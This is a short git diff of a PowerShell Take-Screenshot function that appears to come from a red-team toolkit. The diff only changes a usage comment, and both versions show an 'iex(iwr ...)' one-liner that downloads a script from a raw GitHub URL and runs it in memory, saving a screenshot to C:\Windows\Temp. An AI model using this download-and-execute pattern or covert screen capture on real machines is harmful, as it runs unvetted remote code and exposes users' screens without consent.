@@ -1,5 +1,5 @@
 function Take-Screenshot {
-	# iex(iwr https://raw.githubusercontent.com/Mr-Un1k0d3r/RedTeamPowershellScripts/master/scripts/Take-Screenshot.ps1);Take-Screenshot -Path C:\Windows\Temp\1.png
+	# iex(iwr https://raw.githubusercontent.com/BankSecurity/Red_Team/master/Discovery/Take_ScreenShot_Easy_2.ps1);Take-Screenshot -Path C:\Windows\Temp\1.png
 	# Output file is a png
 	
 	param(
